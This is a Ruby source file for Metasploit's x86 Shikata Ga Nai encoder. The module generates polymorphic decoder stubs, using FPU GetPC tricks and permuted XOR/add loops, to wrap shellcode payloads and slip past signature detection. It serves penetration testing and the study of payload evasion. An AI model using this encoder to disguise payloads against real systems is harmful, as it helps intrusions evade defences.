require 'rex/poly'
require 'msf/core'

module Msf
module Encoders
module X86

class ShikataGaNai < Msf::Encoder::XorAdditiveFeedback

	# The shikata encoder has an excellent ranking because it is polymorphic.
	# Party time, excellent!
	Rank = ExcellentRanking

	def initialize
		super(
			'Name'             => 'Polymorphic XOR Additive Feedback Encoder',
			'Version'          => '$Revision$',
			'Description'      => %q{
				This encoder implements a polymorphic XOR additive feedback encoder.
				The decoder stub is generated based on dynamic instruction
				substitution and dynamic block ordering.  Registers are also
				selected dynamically.
			},
			'Author'           => 'spoonm',
			'Arch'             => ARCH_X86,
			'License'          => GPL_LICENSE,
			'Decoder'          =>
				{
					'KeySize'    => 4,
					'BlockSize'  => 4
				})
	end

	#
	# Generates the shikata decoder stub.
	#
	def decoder_stub(state)
		# If the decoder stub has not already been generated for this state, do
		# it now.  The decoder stub method may be called more than once.
		if (state.decoder_stub == nil)
			block = generate_shikata_block(state, state.buf.length + 4)

			# Set the state specific key offset to wherever the XORK ended up.
			state.decoder_key_offset = block.index('XORK')

			# Take the last four bytes of shikata and prepend them to the buffer
			# that is going to be encoded.
			state.buf = block.slice!(block.length - 4, 4) + state.buf

			# Cache this decoder stub.  The reason we cache the decoder stub is
			# because we need to ensure that the same stub is returned every time
			# for a given encoder state. 
			state.decoder_stub = block	
		end

		state.decoder_stub
	end

protected

	#
	# Returns the set of FPU instructions that can be used for the FPU block of
	# the decoder stub.
	#
	def fpu_instructions
		fpus = []
	
		0xe8.upto(0xee) { |x| fpus << "\xd9" + x.chr }
		0xc0.upto(0xcf) { |x| fpus << "\xd9" + x.chr }
		0xc0.upto(0xdf) { |x| fpus << "\xda" + x.chr }
		0xc0.upto(0xdf) { |x| fpus << "\xdb" + x.chr }
		0xc0.upto(0xc7) { |x| fpus << "\xdd" + x.chr }
	
		fpus << "\xd9\xd0"
		fpus << "\xd9\xe1"
		fpus << "\xd9\xf6"
		fpus << "\xd9\xf7"
		fpus << "\xd9\xe5"
	
		# This FPU instruction seems to fail consistently on Linux
		#fpus << "\xdb\xe1"
	
		fpus
	end

	#
	# Returns a polymorphic decoder stub that is capable of decoding a buffer
	# of the supplied length.
	#
	def generate_shikata_block(state, length)
		# Declare logical registers
		count_reg = Rex::Poly::LogicalRegister::X86.new('count', 'ecx')
		addr_reg  = Rex::Poly::LogicalRegister::X86.new('addr')
		key_reg   = Rex::Poly::LogicalRegister::X86.new('key')

		# Declare individual blocks
		endb = Rex::Poly::SymbolicBlock::End.new

		# FPU blocks
		fpu = Rex::Poly::LogicalBlock.new('fpu',
			*fpu_instructions)
		fnstenv = Rex::Poly::LogicalBlock.new('fnstenv',
			"\xd9\x74\x24\xf4")
		
		# Get EIP off the stack
		popeip = Rex::Poly::LogicalBlock.new('popeip',
			Proc.new { |b| (0x58 + b.regnum_of(addr_reg)).chr })

		# Clear the counter register
		clear_register = Rex::Poly::LogicalBlock.new('clear_register',
			"\x31\xc9",
			"\x29\xc9",
			"\x33\xc9",
			"\x2b\xc9")

		# Initialize the counter after zeroing it
		init_counter = Rex::Poly::LogicalBlock.new('init_counter')

		# Divide the length by four but ensure that it aligns on a block size
		# boundary (4 byte).
		length += 4 + (4 - (length & 3)) & 3
		length /= 4

		if (length <= 255)
			init_counter.add_perm("\xb1" + [ length ].pack('C'))
		else
			init_counter.add_perm("\x66\xb9" + [ length ].pack('v'))
		end

		# Key initialization block
		init_key = Rex::Poly::LogicalBlock.new('init_key',
			Proc.new { |b| (0xb8 + b.regnum_of(key_reg)).chr + 'XORK'})

		# Decoder loop block
		loop_block = Rex::Poly::LogicalBlock.new('loop_block')

		xor  = Proc.new { |b| "\x31" + (0x40 + b.regnum_of(addr_reg) + (8 * b.regnum_of(key_reg))).chr }
		xor1 = Proc.new { |b| xor.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - 4) ].pack('c') }
		xor2 = Proc.new { |b| xor.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - 8) ].pack('c') }
		add  = Proc.new { |b| "\x03" + (0x40 + b.regnum_of(addr_reg) + (8 * b.regnum_of(key_reg))).chr }
		add1 = Proc.new { |b| add.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - 4) ].pack('c') }
		add2 = Proc.new { |b| add.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - 8) ].pack('c') }
		sub4 = Proc.new { |b| "\x83" + (0xe8 + b.regnum_of(addr_reg)).chr + "\xfc" }
		add4 = Proc.new { |b| "\x83" + (0xc0 + b.regnum_of(addr_reg)).chr + "\x04" }

		loop_block.add_perm(
			Proc.new { |b| xor1.call(b) + add1.call(b) + sub4.call(b) },
			Proc.new { |b| xor1.call(b) + sub4.call(b) + add2.call(b) },
			Proc.new { |b| sub4.call(b) + xor2.call(b) + add2.call(b) },
			Proc.new { |b| xor1.call(b) + add1.call(b) + add4.call(b) },
			Proc.new { |b| xor1.call(b) + add4.call(b) + add2.call(b) },
			Proc.new { |b| add4.call(b) + xor2.call(b) + add2.call(b) })
		
		# Loop instruction block
		loop_inst = Rex::Poly::LogicalBlock.new('loop_inst', 
			"\xe2\xf5")

		# Define block dependencies
		fnstenv.depends_on(fpu)
		popeip.depends_on(fnstenv)
		init_counter.depends_on(clear_register)
		loop_block.depends_on(popeip, init_counter, init_key)
		loop_inst.depends_on(loop_block)

		# Generate a permutation saving the ECX and ESP registers
		loop_inst.generate([
			Rex::Arch::X86::ESP,
			Rex::Arch::X86::ECX ], nil, state.badchars)
	end

end

end end end
